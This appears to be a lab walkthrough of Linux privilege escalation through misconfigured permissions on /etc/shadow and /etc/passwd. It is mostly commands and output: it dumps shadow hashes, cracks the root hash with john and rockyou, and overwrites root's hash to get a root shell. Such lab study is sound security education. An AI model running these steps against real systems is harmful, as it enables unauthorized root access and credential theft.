
# `Privilege Escalation by weak file Permissions (`Readable /etc/shadow`)`

# `Privilege Escalation by weak file Permissions (`Writable /etc/shadow`)`

# `Privilege Escalation by weak file Permissions (`Writable /etc/passwd`)`

# We will try to find files with misconfigured permissions using find utility, we will search all directories ie from root dir, We will look for files of which every user has write and read permissions, not execute because we are not looking for binaries or executables, so we will `-o` ie permission for everyone and `+w` as we want find files that canbe edited by anyone

`find / -perm -o+w`

*******************************************************************************************************************
# `Privilege Escalation by weak file Permissions (`Readable /etc/shadow`)`

# Find if /etc/shadow is readble

user@debian:~$ `find / -perm -o+w -ls  2>/dev/null | grep /etc/shadow`
1241191    4 -rw-r--r--   1 root     shadow        837 Aug 25  2019 /etc/shadow
user@debian:~$ 

user@debian:~$ `cat /etc/shadow`
root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
daemon:*:17298:0:99999:7:::
bin:*:17298:0:99999:7:::
sys:*:17298:0:99999:7:::
sync:*:17298:0:99999:7:::
games:*:17298:0:99999:7:::
man:*:17298:0:99999:7:::
lp:*:17298:0:99999:7:::
mail:*:17298:0:99999:7:::
news:*:17298:0:99999:7:::
uucp:*:17298:0:99999:7:::
proxy:*:17298:0:99999:7:::
www-data:*:17298:0:99999:7:::
backup:*:17298:0:99999:7:::
list:*:17298:0:99999:7:::
irc:*:17298:0:99999:7:::
gnats:*:17298:0:99999:7:::
nobody:*:17298:0:99999:7:::
libuuid:!:17298:0:99999:7:::
Debian-exim:!:17298:0:99999:7:::
sshd:*:17298:0:99999:7:::
user:$6$M1tQjkeb$M1A/ArH4JeyF1zBJPLQ.TZQR1locUlz0wIZsoY6aDOZRFrYirKDW5IJy32FBGjwYpT2O1zrR2xTROv7wRIkF8.:17298:0:99999:7:::
statd:*:17299:0:99999:7:::
mysql:!:18133:0:99999:7:::

# We can use john to crack the password

┌──(kali㉿kali)-[~]
└─$ `nano hash.txt`

┌──(kali㉿kali)-[~]
└─$ `cat hash.txt `                                                                                                 
root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::

┌──(kali㉿kali)-[~]
└─$ `john --wordlist=rockyou.txt hash.txt`
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password123      (root)     
1g 0:00:00:01 DONE (2024-01-30 10:15) 0.7633g/s 1172p/s 1172c/s 1172C/s cuties..mexico1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

*******************************************************************************************************************
# `Privilege Escalation by weak file Permissions (`Writable /etc/shadow`)`

student@attackdefense:~$ `find / -perm -o+w -ls  2>/dev/null | grep /etc/shadow`
1241191    4 -rw-rw-rw-   1 root     shadow        837 Aug 25  2019 /etc/shadow

further if we grep on etc we find that even /etc/shadow file is listed, which is only accessible by root user and is strange

# So even being student user we can view and modify shadow file

student@attackdefense:~$ `ls -al /etc/shadow`
-rw-rw-rw- 1 root shadow 523 Sep 23  2018 /etc/shadow
student@attackdefense:~$

student@attackdefense:~$ `cat /etc/shadow`
root:*:17764:0:99999:7:::
daemon:*:17764:0:99999:7:::
bin:*:17764:0:99999:7:::
sys:*:17764:0:99999:7:::
sync:*:17764:0:99999:7:::
games:*:17764:0:99999:7:::
man:*:17764:0:99999:7:::
lp:*:17764:0:99999:7:::
mail:*:17764:0:99999:7:::
news:*:17764:0:99999:7:::
uucp:*:17764:0:99999:7:::
proxy:*:17764:0:99999:7:::
www-data:*:17764:0:99999:7:::
backup:*:17764:0:99999:7:::
list:*:17764:0:99999:7:::
irc:*:17764:0:99999:7:::
gnats:*:17764:0:99999:7:::
nobody:*:17764:0:99999:7:::
_apt:*:17764:0:99999:7:::
student:!:17797::::::
student@attackdefense:~$

# Lets generate a hashed password and copy it into /etc/shadow for root user

# generating using `openssl`

student@attackdefense:~$ `openssl passwd -1 -salt abc password123`
$1$abc$UWUoROXzUCsLsVzI0R2et.

# we can also generate using `mkpasswd` on kali

┌──(kali㉿kali)-[~]
└─$ `mkpasswd -m sha-512 newpasswordhere`
$6$oTvKrJiKZIcu/MLj$q8t7Ip.Plc4rfdRjyUlL9bEx2loeDcROEHph.syr/7.56YGKAPUMNkMQpavEbGo7T3nt/XXZDsuAiz7DlVFpQ.


student@attackdefense:~$ `vim /etc/shadow`

student@attackdefense:~$ `cat /etc/shadow`
root:$1$abc$UWUoROXzUCsLsVzI0R2et.:17764:0:99999:7:::
daemon:*:17764:0:99999:7:::
bin:*:17764:0:99999:7:::
sys:*:17764:0:99999:7:::
sync:*:17764:0:99999:7:::
games:*:17764:0:99999:7:::
man:*:17764:0:99999:7:::
lp:*:17764:0:99999:7:::
mail:*:17764:0:99999:7:::
news:*:17764:0:99999:7:::
uucp:*:17764:0:99999:7:::
proxy:*:17764:0:99999:7:::
www-data:*:17764:0:99999:7:::
backup:*:17764:0:99999:7:::
list:*:17764:0:99999:7:::
irc:*:17764:0:99999:7:::
gnats:*:17764:0:99999:7:::
nobody:*:17764:0:99999:7:::
_apt:*:17764:0:99999:7:::
student:!:17797::::::
student@attackdefense:~$

# Now we elevate privileges by switch user comand

student@attackdefense:~$ su
Password: `password123`
root@attackdefense:/home/student# `id`
uid=0(root) gid=0(root) groups=0(root)
root@attackdefense:/home/student#


# Now this is just a demonstration in real case it will not be the /etc/shado file with improper permission but it can be any other file on system which can be used to elevate our privileges or can be used to damage in other way

*******************************************************************************************************************
# `Privilege Escalation by weak file Permissions (`Writable /etc/passwd`)`

# The /etc/passwd file contains information about user accounts. It is world-readable, but usually only writable by the root user. 

# The /etc/passwd file contains `x` instead of user password hashes, but some versions of Linux will still allow password hashes to be stored there.

user@debian:~$ `find / -perm -o+w -ls  2>/dev/null | grep /etc/passwd`
1241131    4 -rw-r--rw-   1 root     root         1009 Aug 25  2019 /etc/passwd
user@debian:~$ 

user@debian:~$ `cat /etc/passwd`
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
Debian-exim:x:101:103::/var/spool/exim4:/bin/false
sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin
user:x:1000:1000:user,,,:/home/user:/bin/bash
statd:x:103:65534::/var/lib/nfs:/bin/false
mysql:x:104:106:MySQL Server,,,:/var/lib/mysql:/bin/false
user@debian:~$ 

# Generate a new password hash with a password of your choice:

user@debian:~$ `openssl passwd newpasswordhere`
Warning: truncating password to 8 characters
/034bwUXRawkM


# Edit the /etc/passwd file and place the generated password hash between the first and second colon (:) of the root user's row (replacing the "x").

user@debian:~$ `nano /etc/passwd`

# Switch to the root user, using the new password:

user@debian:~$ su 
Password: 
root@debian:/home/user# id
uid=0(root) gid=0(root) groups=0(root)
root@debian:/home/user# 

# Alternatively, copy the root user's row and append it to the bottom of the file, changing the first instance of the word "root" to "newroot" and placing the generated password hash between the first and second colon (replacing the "x"). Now switch to the newroot user, using the new password: